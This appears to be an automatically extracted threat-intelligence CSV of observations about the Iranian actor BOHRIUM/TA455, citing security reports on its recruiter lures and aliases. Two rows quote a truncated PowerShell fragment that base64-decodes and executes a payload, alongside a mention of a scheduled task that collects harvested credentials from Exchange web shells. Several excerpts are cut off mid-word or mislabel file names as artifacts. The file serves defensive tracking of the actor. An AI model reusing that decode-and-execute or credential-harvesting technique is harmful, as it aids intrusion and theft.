schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--bohrium,artifact--sha256:8fbc9434d4180a1d96d7cc1fb3a1dd55389ed238646fd7578d115d0710fce406,observation--sha256:676fb81a12a8ac0af8c59115e3bf16be89e274ae7c045af638003c396385af21,command,"International Strategic/Iran/report-incident-response-middle-east.pdf {""page"": 43} BOHRIUM ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 Table 10. Details of web shells employed by the adver","International Strategic/Iran/report-incident-response-middle-east.pdf {""page"": 43} BOHRIUM ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 Table 10. Details of web shells employed by the adver",candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"International Strategic/Iran/report-incident-response-middle-east.pdf {""page"": 43} BOHRIUM ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 Table 10. Details ",
1.0.0,actor--bohrium,artifact--sha256:8186eb53973735573a0774d89464eb7feeab36b576f349a2540bb481d84758bb,observation--sha256:7e1c0bfca407987e9c02cfef6deb30ccff7df28a7108b6aa0d31f74ac43521d5,command,"International Strategic/Iran/report-incident-response-middle-east.pdf {""page"": 44} BOHRIUM ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 (external facing Microsoft Exchange servers). Levera","International Strategic/Iran/report-incident-response-middle-east.pdf {""page"": 44} BOHRIUM ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 (external facing Microsoft Exchange servers). Levera",candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"International Strategic/Iran/report-incident-response-middle-east.pdf {""page"": 44} BOHRIUM ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 (external facing M",
1.0.0,actor--bohrium,artifact--sha256:2bd89985e3ebadf645257b4b9bf31a98695952232c544e9ca348c6e6284bfffc,observation--sha256:f8c4e9b1b2ad1e6fdbafdc2422038222ad8dcd1f73c393d3294260dfa83db277,file-name,2022-year-in-retrospect-report.pdf,2022-year-in-retrospect-report.pdf,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"summary/2023/2022-year-in-retrospect-report.pdf {""page"": 35} BOHRIUM perimented with MSI files as malicious lures in similar campaigns, likely in an attempt to diversify initial access techniques. • Iran-based threat actor employing an espionage motivated campaign Yellow Dev 13 (a.k.a. BOHRIUM, TA455) also posed as recruiters for real or fictitious companies across a variety of social media, including LinkedIn, Facebook, Instagram and Twitter, despite takedowns by Meta142 and Microsoft.143 Yello",
1.0.0,actor--bohrium,artifact--sha256:2bd89985e3ebadf645257b4b9bf31a98695952232c544e9ca348c6e6284bfffc,observation--sha256:356c77f522f7f2ee84e98647aca98ce8cea3181cea63fc969d314f0ac8a14fec,file-name,2022-year-in-retrospect-report.pdf,2022-year-in-retrospect-report.pdf,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"summary/2023/2022-year-in-retrospect-report.pdf {""page"": 76} BOHRIUM pg. 46-47 • White Taranis (a.k.a. Emotet): The threat actor behind Emotet and tied to Blue Cronus. - pg. 47-48 • White Tur - pg. 35-36 • Yellow Dev 9 (a.k.a. Lyceum, Hexane) - pg. 28 (footnote) • Yellow Dev 13 (a.k.a. BOHRIUM, TA455) - pg. 34-35 • Yellow Dev 19 (a.k.a. Emennet Pasargad) - pg. 28 • Yellow Dev 24 (a.k.a. DEV-0270, Nemesis Kitten) - pg. 27 • Yellow Dev 31 (a.k.a. DEV -0842) - pg. 28 (footnote) • Yellow Dev 32 - pg",
1.0.0,actor--bohrium,artifact--sha256:5ce3f5f52fb4fa1307633da696aa5198cb1e0ffda8624ca509a302eea6a80d2c,observation--sha256:794d965b076e2accf8fab062ef928d0c7d90072a7507794a3c591e2419a46842,file-name,2022.pdf,2022.pdf,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"summary/2022/Microsoft Digital Defense Report 2022.pdf {""page"": 35} BOHRIUM ssia Israeli defense industry, IT Po POLONIUM Lebanon Iran Energy, aviation, critical manufacturing, defense industrial base EnergeticBear Br BROMINE IT, shipping companies, Middle East governments Tortoiseshell Bh BOHRIUM North Korea Government, defense, science and technology Lazarus Zn ZINC 34 Microsoft Digital Defense Report 2022 Report Introduction Cyber Resilience Contributing Teams The State of Cybercrime Cyber In",
1.0.0,actor--bohrium,artifact--sha256:f60ff54271b62aeba2de61552e6e52e8aa030f7ace3f1b940118ce9e24817317,observation--sha256:757e46b4a07a7a6f55cf05d8557ae2a20aca669fb1fa6ad254979e6a43c5b290,file-name,Cloudflare-2026-threat-report.pdf,Cloudflare-2026-threat-report.pdf,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"summary/2026/Cloudflare-2026-threat-report.pdf {""page"": 32} Smoke Sandstorm bsites.net) and using ONLYOFFICE as a payload-hosting platform to blend in with legitimate enterprise traffic. High-touch social engineering and human-in-the-loop interaction for 2FA interception Aliases / AKAs: C5, Smoke Sandstorm, Screening Serpens, TA455 Threat actor profile CrustyKrill Government and defense contractors via recruitment and career-based lures PDQ Connect, ClickFix data theft, and fake Google Meet and ",
1.0.0,actor--bohrium,artifact--sha256:9ffd60709b92ebdf8b2574d799d37db69394631121511c5bbe4adfbf49c2075d,observation--sha256:50accbc584caaf8139e2f8e05b463e8e430200afc0a61dde7d61bef84f74e3e2,file-name,Iranian-Dream-Job-ver1.pdf,Iranian-Dream-Job-ver1.pdf,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"Charming Kitten/Iranian-Dream-Job-ver1.pdf {""page"": 4} BOHRIUM e discovered was associated with a fake company called ""Careers 2 Find"" which previously worked for ""1st Employer"", a fake recruiting website highlighted by Mandiant in February. TA455, also known as Smoke Sandstorm, BOHRIUM and Yellow Dev13 , is a subgroup of Iranian threat actor Charming Kitten (APT35). TA455 targets organizations in Israel using double attack scenarios (two scenarios in one attack, one malicious and one for camouf",
1.0.0,actor--bohrium,artifact--sha256:9ffd60709b92ebdf8b2574d799d37db69394631121511c5bbe4adfbf49c2075d,observation--sha256:fa26509cfa47495c05b50fa4ed107830e18800edf55054975f8712e4a16d723e,file-name,Iranian-Dream-Job-ver1.pdf,Iranian-Dream-Job-ver1.pdf,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"Charming Kitten/Iranian-Dream-Job-ver1.pdf {""page"": 4} Smoke Sandstorm t. One profile we discovered was associated with a fake company called ""Careers 2 Find"" which previously worked for ""1st Employer"", a fake recruiting website highlighted by Mandiant in February. TA455, also known as Smoke Sandstorm, BOHRIUM and Yellow Dev13 , is a subgroup of Iranian threat actor Charming Kitten (APT35). TA455 targets organizations in Israel using double attack scenarios (two scenarios in one attack, one mali",
1.0.0,actor--bohrium,artifact--sha256:6189ae5ce181e028946daac638b3df15ad8452edaf17f607ffb9a93ea57db912,observation--sha256:6a498019925896c7e04c8d55956be572ae107543ae35042cf7494c5ef7bf4c4f,file-name,Operations.xlsx,Operations.xlsx,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"APT Groups and Operations.xlsx {""row"": 40, ""sheet"": ""Iran""} Bohrium Bohrium https://securityaffairs.com/132002/apt/microsoft-seized-bohrium-apt-domains.html",
1.0.0,actor--bohrium,artifact--sha256:6189ae5ce181e028946daac638b3df15ad8452edaf17f607ffb9a93ea57db912,observation--sha256:c8678d80401668b8f3f6418dfd92f1978d5ae5d3038dfa6479d7174edad0eefd,file-name,Operations.xlsx,Operations.xlsx,candidate,,unknown,unknown,not-stated,,source--bohrium--ffc8b58cbb25f4b6,actor_profile/evidence/bohrium.csv,"{""row"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,csv-row,"APT Groups and Operations.xlsx {""row"": 40, ""sheet"": ""Iran""} bohrium Bohrium https://securityaffairs.com/132002/apt/microsoft-seized-bohrium-apt-domains.html",
